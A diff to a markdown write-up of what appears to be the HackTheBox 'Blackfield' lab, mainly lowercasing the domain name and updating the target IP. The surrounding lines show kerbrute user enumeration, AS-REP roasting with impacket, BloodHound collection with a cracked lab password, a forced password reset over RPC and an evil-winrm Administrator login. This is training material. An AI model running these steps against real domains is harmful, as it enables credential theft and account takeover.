@@ -44,7 +44,7 @@ PORT     STATE SERVICE
 ```
 {{< /collapse >}}
 
-Domain: `BLACKFIELD.LOCAL`, DC01.
+Domain: `blackfield.local`, DC01.
 
 ### SMB - Null Access
 
@@ -62,7 +62,7 @@ The `profiles$` share contains hundreds of user profile directories -- a ready-m
 Using the profile names as a wordlist:
 
 ```bash
-kerbrute userenum --dc 10.129.86.219 -d "BLACKFIELD.LOCAL" userlist
+kerbrute userenum --dc 10.129.229.17 -d "blackfield.local" userlist
 
 [+] VALID USERNAME: audit2020@BLACKFIELD.LOCAL
 [+] VALID USERNAME: svc_backup@BLACKFIELD.LOCAL
@@ -79,7 +79,7 @@ The `support` account doesn't require Kerberos pre-authentication:
 
 ```bash
 impacket-GetNPUsers blackfield.local/support \
-  -format john -outputfile hash -dc-ip 10.129.86.219 -no-pass
+  -format john -outputfile hash -dc-ip 10.129.229.17 -no-pass
 ```
 
 Crack it:
@@ -101,15 +101,15 @@ Credentials: `support:#00^BlackKnight` -- but no direct shell access.
 Running BloodHound with support's credentials reveals that `support` has `ForceChangePassword` rights over `audit2020`:
 
 ```bash
-bloodhound-python -ns 10.129.229.17 -d 'BLACKFIELD.local' \
-  -dc 'DC01.BLACKFIELD.local' -u 'support' -p '#00^BlackKnight'
+bloodhound-python -ns 10.129.229.17 -d 'blackfield.local' \
+  -dc 'DC01.blackfield.local' -u 'support' -p '#00^BlackKnight'
 ```
 
 Change audit2020's password without knowing the original:
 
 ```bash
 net rpc password 'audit2020' 'Pa$$w0rd2023!' \
-  -U 'BLACKFIELD.local/support%#00^BlackKnight' -S 10.129.229.17
+  -U 'blackfield.local/support%#00^BlackKnight' -S 10.129.229.17
 ```
 
 ### Stage 2: LSASS Dump → svc_backup
@@ -186,7 +186,7 @@ evil-winrm -i 10.129.229.17 -u 'Administrator' \
 
 {{< terminal title="root@blackfield" >}}
 whoami
-nt authority\system
+blackfield\administrator
 {{< /terminal >}}
 
 ---
